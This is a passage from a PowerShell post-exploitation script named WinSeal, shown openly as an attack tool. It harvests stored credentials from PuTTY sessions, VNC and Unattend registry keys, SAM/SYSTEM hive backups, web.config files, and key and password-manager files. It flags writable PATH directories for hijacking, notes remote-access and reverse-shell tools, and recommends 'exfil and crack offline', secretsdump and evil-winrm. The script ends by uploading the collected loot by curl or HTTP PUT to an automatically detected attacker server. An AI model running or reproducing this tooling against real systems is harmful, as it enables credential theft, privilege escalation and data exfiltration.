        if ($sp.ProxyPassword) { $extra = " PROXY PASSWORD: $($sp.ProxyPassword)"; Hi "PUTTY SESSION: $($sess.PSChildName) -> $($sp.HostName)$extra"; Rec "[CREDS] PuTTY saved session '$($sess.PSChildName)' has proxy password: $($sp.ProxyPassword)" }
        else { Info "PuTTY session: $($sess.PSChildName) -> $($sp.HostName)" }
    }
} catch {}

# Registry password grep (common locations)
$regHunt = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Unattend",
    "HKCU:\Software\ORL\WinVNC3",
    "HKLM:\SOFTWARE\RealVNC\WinVNC4"
)
foreach ($r in $regHunt) {
    if (Test-Path $r -ErrorAction SilentlyContinue) {
        try {
            $rp = Get-ItemProperty $r
            $rp.PSObject.Properties | Where-Object { $_.Name -match "pass|pwd" -and $_.Value } | ForEach-Object {
                Hi "REGISTRY CRED: $r\$($_.Name) = $($_.Value)"
                Rec "[CREDS] $r -> $($_.Name) = $($_.Value)"
            }
        } catch {}
    }
}

# SAM / SYSTEM backups
$hiveBackups = @(
    "C:\Windows\Repair\SAM", "C:\Windows\Repair\SYSTEM",
    "C:\Windows\System32\config\RegBack\SAM", "C:\Windows\System32\config\RegBack\SYSTEM",
    "C:\Windows\System32\config\SAM.bak", "C:\Windows\System32\config\SYSTEM.bak"
)
$foundSam = $false; $foundSys = $false
foreach ($h in $hiveBackups) {
    if (Test-Path $h -ErrorAction SilentlyContinue) {
        if ($h -match "SAM") { $foundSam = $true } else { $foundSys = $true }
        Warn "HIVE BACKUP: $h"
    }
}
if ($foundSam -and $foundSys) {
    Hi "SAM + SYSTEM hive backups available - dump local hashes offline!"
    Rec "[CREDS] SAM+SYSTEM backups found -> exfil both files and run: secretsdump.py -sam SAM -system SYSTEM LOCAL"
}

# web.config with credentials
$webRoots = @("C:\inetpub\wwwroot", "C:\inetpub")
foreach ($wr in $webRoots) {
    if (Test-Path $wr -ErrorAction SilentlyContinue) {
        try {
            $confs = @(Get-ChildItem $wr -Recurse -Include "web.config","*.config" -ErrorAction SilentlyContinue | Select-Object -First 30)
            foreach ($cf in $confs) {
                $content = Get-Content $cf.FullName -Raw -ErrorAction SilentlyContinue
                if ($content -match "(?i)password\s*=|connectionString|credentials") {
                    Hi "CONFIG WITH CREDENTIALS: $($cf.FullName)"
                    Rec "[CREDS] $($cf.FullName) -> contains connection string/password (DB creds, often reused)"
                }
            }
        } catch {}
    }
}

# Interesting files in user profiles
Section "INTERESTING FILES (user profiles)"

$patterns = @("*.kdbx", "*.kdb", "*passw*.txt", "*passw*.xls", "*passw*.doc", "*cred*.txt", "*.pem", "*.ppk", "id_rsa", "*.ovpn", "unattend.xml", "*.vmdk")
$foundFiles = 0
try {
    $searchRoots = @("C:\Users")
    if (Test-Path "C:\xampp") { $searchRoots += "C:\xampp" }
    foreach ($root in $searchRoots) {
        foreach ($pat in $patterns) {
            if ($foundFiles -ge 40) { break }
            $hits = @(Get-ChildItem $root -Recurse -Filter $pat -ErrorAction SilentlyContinue | Select-Object -First 10)
            foreach ($f in $hits) {
                $foundFiles++
                if ($pat -match "kdb|ppk|id_rsa|pem") {
                    Hi "$($f.FullName)"
                    Rec "[CREDS] $($f.FullName) -> key/credential database file, exfil and crack offline"
                } else { Warn "$($f.FullName)" }
            }
        }
    }
} catch {}
if ($foundFiles -eq 0) { Info "No interesting files found in quick sweep" }

# ── PATH HIJACKING ───────────────────────────────────────────
Section "PATH - WRITABLE DIRECTORIES (hijack)"

$systemPath = [Environment]::GetEnvironmentVariable("PATH", "Machine") -split ";"
foreach ($p in $systemPath) {
    $p2 = Resolve-EnvPath $p
    if (-not $p2 -or -not (Test-Path -LiteralPath $p2 -ErrorAction SilentlyContinue)) { continue }
    if ($p2 -match "(?i)Windows\\System32|Windows\\SysWOW64|^C:\\Windows$|Program Files") { continue }
    if (Test-WriteAccess $p2) {
        Hi "WRITABLE PATH DIR (system PATH): $p2"
        Rec "[PRIVESC] '$p2' is writable and in the SYSTEM PATH -> DLL/binary hijack a service or admin process loading from PATH"
    } else {
        Info "PATH dir not writable: $p2"
    }
}

# ── WRITABLE INTERESTING LOCATIONS ───────────────────────────
Section "WRITABLE LOCATIONS (system dirs)"

$sysDirs = @("C:\Windows\Temp", "C:\Windows\Tasks", "C:\Windows\tracing", "C:\Windows\System32\spool\drivers\color", "C:\ProgramData")
foreach ($d in $sysDirs) {
    if (Test-WriteAccess $d) {
        Info "Writable: $d  (useful as scratch/AppLocker-bypass space)"
    }
}
$progData = @(Get-ChildItem "C:\ProgramData" -ErrorAction SilentlyContinue | Where-Object { $_.PSIsContainer })
foreach ($pd in $progData) {
    if (Test-WriteAccess $pd.FullName) {
        Warn "Writable ProgramData subdir: $($pd.FullName)"
    }
}

# ── RDP / WINRM / REMOTE ACCESS ──────────────────────────────
Section "REMOTE ACCESS"

try {
    $rdp = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -ErrorAction Stop).fDenyTSConnections
    if ($rdp -eq 0) { Info "RDP ENABLED" } else { Info "RDP disabled (fDenyTSConnections=1)" }
} catch {}
try {
    $nla = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name UserAuthentication -ErrorAction Stop).UserAuthentication
    if ($nla -eq 0) { Warn "RDP NLA DISABLED - pre-auth session possible (useful for MitM/cred capture)" }
} catch {}
$winrm = @()
try { $winrm = @(Get-Service WinRM -ErrorAction Stop) } catch {}
if ($winrm -and $winrm[0].Status -eq "Running") { Info "WinRM RUNNING (5985/5986) - lateral movement via evil-winrm if creds found" }

# ── AVAILABLE TOOLS ──────────────────────────────────────────
Section "AVAILABLE TOOLS"

$toolNames = @("powershell", "cmd", "net", "netsh", "sc", "schtasks", "reg", "wmic", "certutil", "bitsadmin", "curl", "wget", "ftp", "python", "python3", "py", "perl", "ruby", "java", "mshta", "rundll32", "regsvr32", "cscript", "wscript", "msiexec", "nc", "ncat", "plink", "ssh", "tar", "vssadmin", "esentutl", "msbuild", "installutil", "regasm", "regsvcs", "winrs", "makecab", "expand")
foreach ($t in $toolNames) {
    $found = Get-Command $t -ErrorAction SilentlyContinue
    if ($found) {
        $low = $t.ToLower()
        if ($low -match "^(python|python3|perl|ruby|nc|ncat|plink|ssh|java)$") {
            Hi "$t -> $($found.Source) (useful for reverse shells / tunnels)"
        } else { Info "$t" }
    }
}

# ── RECOMMENDATIONS ──────────────────────────────────────────
Section "RECOMMENDATIONS"

if ($script:Recs.Count -gt 0) {
    $privesc = @($script:Recs | Where-Object { $_ -like "[PRIVESC]*" })
    $creds   = @($script:Recs | Where-Object { $_ -like "[CREDS]*" })
    $enum    = @($script:Recs | Where-Object { $_ -like "[ENUM]*" })
    $evasion = @($script:Recs | Where-Object { $_ -like "[EVASION]*" })
    $lateral = @($script:Recs | Where-Object { $_ -like "[LATERAL]*" })

    Emit "  Privilege Escalation vectors: $($privesc.Count)" "Red"
    Emit "  Credentials leads: $($creds.Count)" "Red"
    Emit "  Enumeration leads: $($enum.Count)" "Yellow"
    Emit "  Evasion notes: $($evasion.Count)" "Green"
    Emit "" "White"

    if ($privesc.Count -gt 0) {
        Emit "--- Privilege Escalation ---" "Red"
        foreach ($r in $privesc) { Emit "  > $($r -replace '^\[PRIVESC\] ','')" "Red" }
        Emit "" "White"
    }
    if ($creds.Count -gt 0) {
        Emit "--- Credentials ---" "Red"
        foreach ($r in $creds) { Emit "  > $($r -replace '^\[CREDS\] ','')" "Red" }
        Emit "" "White"
    }
    if ($enum.Count -gt 0) {
        Emit "--- Enumeration ---" "Yellow"
        foreach ($r in $enum) { Emit "  > $($r -replace '^\[ENUM\] ','')" "Yellow" }
        Emit "" "White"
    }
    if ($evasion.Count -gt 0) {
        Emit "--- Evasion ---" "Green"
        foreach ($r in $evasion) { Emit "  > $($r -replace '^\[EVASION\] ','')" "Green" }
        Emit "" "White"
    }
    if ($lateral.Count -gt 0) {
        Emit "--- Lateral Movement ---" "Green"
        foreach ($r in $lateral) { Emit "  > $($r -replace '^\[LATERAL\] ','')" "Green" }
        Emit "" "White"
    }
} else {
    Info "No notable findings to recommend."
}

# ══════════════════════════════════════════════════════════════
#                         SCAN COMPLETE
# ══════════════════════════════════════════════════════════════

Emit "" "White"
Emit "╔══════════════════════════════════════════════╗" "Blue"
Emit "║          WinSeal scan complete               ║" "Green"
Emit "╚══════════════════════════════════════════════╝" "Blue"
Emit "" "White"
Emit "[!] = Critical   [+] = Info   [*] = Interesting" "Yellow"
Emit "" "White"

# ── Post-scan: summary ───────────────────────────────────────
if ($OutFile) {
    $lines = 0
    try { $lines = (Get-Content $OutFile | Measure-Object -Line).Lines } catch {}
    if (-not $Silent) { Write-Host "[+] Output saved to: $OutFile ($lines lines)" -ForegroundColor Green }
}

# ── Post-scan: upload to loot ────────────────────────────────
if ($Loot -and $OutFile) {
    if (-not $LHost) {
        # auto-detect: first established non-loopback remote IP
        try {
            $conns = @(Get-NetTCPConnection -State Established -ErrorAction Stop | Where-Object {
                $_.RemoteAddress -notmatch "^(127\.|::1|0\.0\.0\.0)$"
            })
            if ($conns.Count -gt 0) { $LHost = $conns[0].RemoteAddress }
        } catch {
            try {
                $ns = netstat -n 2>$null | Select-String "ESTABLISHED" | Select-Object -First 1
                if ($ns -and $ns.Line -match "(\d{1,3}(\.\d{1,3}){3}):\d+\s*$") { $LHost = $Matches[1] }
            } catch {}
        }
    }
    $uploaded = $false
    if ($LHost) {
        $ports = @()
        if ($SLPort) { $ports += $SLPort } else { $ports += @(2727, 2020, 8080, 8000, 80, 8443, 9090) }
        $fname = Split-Path $OutFile -Leaf
        foreach ($port in $ports) {
            $url = "http://${LHost}:${port}/upload/$fname"
            # 1) curl.exe (Win10+)
            try {
                $cu = Get-Command curl.exe -ErrorAction Stop
                $null = & curl.exe -sf -m 4 -T "$OutFile" "$url" 2>$null
                if ($LASTEXITCODE -eq 0) {
                    Write-Host "[+] Uploaded to loot: $url" -ForegroundColor Green
                    $uploaded = $true
                    break
                }
            } catch {}
            # 2) PowerShell native PUT
            try {
                $bytes = [System.IO.File]::ReadAllBytes((Resolve-Path $OutFile).Path)
                $req = [System.Net.HttpWebRequest]::Create($url)
                $req.Method = "PUT"
                $req.Timeout = 4000
                $req.ContentLength = $bytes.Length
                $rs = $req.GetRequestStream()
                $rs.Write($bytes, 0, $bytes.Length)
                $rs.Close()
                $resp = $req.GetResponse()
                $resp.Close()
                Write-Host "[+] Uploaded to loot: $url" -ForegroundColor Green
                $uploaded = $true
                break
            } catch {}
        }
    }
    if (-not $uploaded) {
        Write-Host "[*] Loot upload failed - could not reach SeaLion server" -ForegroundColor Yellow
        if (-not $LHost) { Write-Host "[*] Set LHOST manually: `$env:LHOST='<ip>'; .\winseal.ps1 -o -l" -ForegroundColor Yellow }
    }
} elseif ($Loot -and -not $OutFile) {
    Write-Host "[*] -l requires -o (need a file to upload)" -ForegroundColor Yellow
}

# ── Notify in shell ──────────────────────────────────────────
if ($Silent) {
    $msg = "[+] WinSeal scan complete."
    if ($OutFile) { $msg += " Output: $OutFile" }
    Write-Host $msg -ForegroundColor Green
}
